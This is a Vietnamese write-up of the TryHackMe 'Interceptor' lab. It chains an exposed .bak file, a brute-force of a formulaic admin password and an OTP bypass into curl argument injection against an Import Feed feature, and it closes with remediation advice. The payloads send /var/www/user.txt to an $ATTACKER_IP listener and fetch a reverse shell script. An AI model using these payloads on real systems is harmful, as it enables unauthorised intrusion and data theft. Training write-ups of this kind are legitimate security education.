@@ -1,0 +1,156 @@
+---
+title: 'Interceptor'
+description: 'Một file .bak bị lộ phơi bày mật khẩu admin dễ đoán; brute-force nó cùng một OTP bypass đưa tới admin panel, nơi tính năng Import Feed đưa input vào curl và một blacklist chỉ lọc ;&| bị đánh bại bằng curl argument injection để đọc file và lấy shell www-data.'
+date: 2026-06-25
+platform: tryhackme
+room: 'Interceptor'
+roomUrl: 'https://tryhackme.com/room/interceptor'
+difficulty: medium
+tags:
+  - 'web'
+  - 'php'
+  - 'command-injection'
+  - 'linux'
+vulnClasses:
+  - 'world-readable secret file'
+  - 'weak credentials'
+  - 'authentication bypass'
+  - 'insecure command execution'
+translation: done
+draft: false
+---
+
+_Hướng dẫn giải phòng "Interceptor" trên TryHackMe (MediaHub). Một file_ _`.bak`_ _bị bỏ quên làm lộ mã nguồn trang login và một ghi chú của lập trình viên về định dạng mật khẩu admin; ta brute-force nó, luồn qua bước OTP, và chạm tới tính năng admin “Import Feed” đưa input của ta vào_ _`curl`\*\*. Bộ lọc của nó chỉ gỡ_ _`;`\*\*,_ _`&`_ _và_ _`|`\*\*, nên ta dùng_ **_argument injection_** _của curl để đọc file local và lấy shell www-data._
+
+> Interceptor là một challenge huấn luyện hợp pháp trên TryHackMe; mọi thao tác ở đây đều thực hiện trên mục tiêu luyện tập được cấp phép. Các flag và mật khẩu admin hiển thị dưới dạng `THM{<redacted>}` / `<redacted>` — có thật trên máy, giấu đi ở đây. Writeup này ghi lại đúng chuỗi đã thực hiện: nó kết thúc ở bàn đạp www-data và user flag; không có bước leo thang đặc quyền lên root nào được thực hiện.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+MediaHub (vhost `intercept.thm`) đặt `PHPSESSID` mà không có `HttpOnly`; quét thư mục tìm ra một backup **`login.php.bak`** phục vụ PHP dưới dạng plaintext, làm lộ một ghi chú dev: admin là `admin@mediahub.thm` và mật khẩu là **`MediaHub`** **+ một năm** → brute endpoint `api_login.php` và một năm gần đây trúng → login sau đó đòi một **OTP**, bị bypass bằng Burp → tính năng **Import Feed** của admin chạy `curl -s <url>` và bộ lọc chỉ gỡ `;&|` → dùng **curl argument injection** (`-F file=@/var/www/user.txt`) để rút file local rồi fetch một reverse shell → **shell dưới www-data** và user flag.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-ip>
+```
+
+`nmap` cho thấy SSH, một DNS server, và một site Apache (MediaHub) có cookie session thiếu `HttpOnly`:
+
+```text
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+53/tcp open  domain  ISC BIND 9.16.1
+80/tcp open  http    Apache httpd 2.4.41   # MediaHub  (PHPSESSID: httponly flag not set)
+```
+
+Làm việc với vhost `intercept.thm`. Quét thư mục ồn ào nhưng hiệu quả:
+
+```text
+gobuster dir -u http://intercept.thm/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x php --exclude-length=1491
+# config.php  dashboard.php(->login)  login.php  otp.php  search.php  phpmyadmin/  uploads/
+ffuf -u http://intercept.thm/login.php.FUZZ -w <(echo -e "bak\nold\ntxt\nswp") -fs 1491
+# bak  [Status: 200]
+```
+
+### **Lỗ hổng**
+
+Backup `login.php.bak` được phục vụ dưới dạng plaintext (Apache chỉ _thực thi_ `.php`), phơi bày mã nguồn và, quan trọng nhất, một comment của lập trình viên:
+
+```text
+# Admin test account for staging environment
+# Email: admin@mediahub.thm
+# Admin password follows company format: MediaHub + any year
+```
+
+Điều đó trao cho ta username và một không gian khóa tí xíu cho mật khẩu. Sau khi login, một cổng OTP chặn đường, và khi vào được, công cụ admin **Import Feed** fetch một URL do người dùng cung cấp bằng `curl` sau một blacklist yếu.
+
+<Callout type="insight">
+
+Bộ lọc ở client là `url.replace(/[;&|]/g, '')` — nó chỉ diệt các ký tự nối lệnh. Nhưng backend chạy đại loại `shell_exec("curl -s " + url)`, nên bạn không cần _nối_ một lệnh mới: chỉ cần chèn thêm **đối số của curl**. `curl` vui vẻ nhận nhiều URL và cờ, nên `-F file=@/var/www/user.txt http://$ATTACKER_IP:4444` khiến server đọc một file local và POST nó về cho bạn. Argument injection lướt thẳng qua một blacklist chỉ dựng cho `;`, `&` và `|`.
+
+</Callout>
+
+### **Bước 1 — brute mật khẩu admin dễ đoán**
+
+Ta spray `MediaHub<year>` vào API login JSON; một năm gần đây trả về thành công và kích hoạt bước OTP:
+
+```text
+for y in $(seq 2000 2026); do
+  echo -n "$y "
+  curl -s -X POST "http://intercept.thm/api_login.php" \
+    -F 'email=admin@mediahub.thm' -F "password=MediaHub$y"
+  echo
+done
+# ...
+# <redacted year> {"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}
+```
+
+### **Bước 2 — bypass OTP và chạm tới admin panel**
+
+Bước xác thực hai lớp được áp dụng lỏng lẻo/phía client, và bị bypass bằng cách thao túng request trong Burp để đi thẳng tới dashboard đã xác thực. Giao diện admin thậm chí gói flag đầu tiên trong một thuộc tính tooltip:
+
+```text
+<h4 ... title="Flag: THM{<redacted>}">Import Feed</h4>
+```
+
+### **Bước 3 — curl argument injection → đọc file → shell www-data (user flag)**
+
+Ô Import Feed đưa vào `curl -s <url>`. Thay vì nối lệnh (các ký tự `;&|` bị gỡ), ta chèn cờ curl để upload một file local tới listener của ta:
+
+```text
+# payload nhập vào ô feed URL:
+http://example.com/ -F file=@/var/www/user.txt http://$ATTACKER_IP:4444
+
+# attacker
+nc -lvnp 4444
+# POST / ... multipart/form-data ...
+# filename="user.txt"
+# THM{<redacted>}
+```
+
+Cùng kỹ thuật argument injection đó sau đó được dùng để fetch và chạy một script reverse shell, cho một bàn đạp tương tác dưới quyền user web:
+
+```text
+python3 -m http.server 8000   # serving shell.sh
+nc -lvnp 4444
+# www-data@interceptor:/var/www/html$ cd /var/www && cat user.txt
+# THM{<redacted>}
+```
+
+### **Dừng lại ở đâu**
+
+Tới điểm này ta giữ một shell dưới **www-data** và user flag. Writeup này chỉ ghi lại những gì đã thực hiện — một đường leo thang đặc quyền lên root chưa được hoàn thành ở đây, nên không tuyên bố gì về nó. Liệt kê các binary SUID, `sudo -l`, cron job, và instance MySQL/phpMyAdmin local là bước tự nhiên tiếp theo hướng tới root.
+
+### **Tác động**
+
+<Callout type="critical">
+
+**Cao — CVSS 3.1 \~8.1** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L`). Một file backup ai cũng đọc được làm lộ mã nguồn và một credential admin dễ đoán; kết hợp với một cổng OTP yếu, điều đó cho quyền admin đầy đủ mà không cần bí mật thực sự. Tính năng admin Import Feed sau đó cho phép curl argument injection — đọc file local tuỳ ý và thực thi mã từ xa dưới quyền user web — phơi bày dữ liệu ứng dụng và cho một bàn đạp tương tác trên host.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+- **Gỡ bỏ file editor/backup khỏi web root** và cấu hình server từ chối `.bak`/`.old`/`.swp`; không bao giờ ship mã nguồn kèm credential trong comment.
+- **Ép mật khẩu mạnh, không theo công thức.** “`MediaHub` + năm” là một không gian khóa 27 phần tử.
+- **Xác minh OTP ở server** và gắn nó với session; một yếu tố thứ hai có thể bỏ qua trong request thì không phải là yếu tố gì cả.
+- **Không dựng lệnh shell từ input người dùng.** Blacklist `;&|` bỏ sót hoàn toàn argument injection — dùng một HTTP client thực với danh sách đối số cố định, xác minh URL, và không bao giờ đưa nó vào shell.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **Luôn fuzz các đuôi backup.** Một `.bak` biến trang login thành một vụ lộ credential.
+- **Một công thức không phải là mật khẩu.** Một sơ đồ đặt tên được ghi lại làm sụp không gian khóa xuống còn gần như không.
+- **Argument injection ≠ command injection.** Lọc `;`, `&`, `|` chẳng làm gì được khi kẻ tấn công chỉ thêm cờ vào lệnh đã có — `curl -F @file` là một primitive đọc file.
+- **Chỉ ghi lại những gì bạn đã làm.** Chuỗi ở đây kết thúc ở bàn đạp www-data; root vẫn là việc của tương lai.
+
+Interceptor là một lời nhắc sắc bén rằng phần nguy hiểm của một lệnh “an toàn” có thể chính là đối số của nó. Cảm ơn đã đọc.
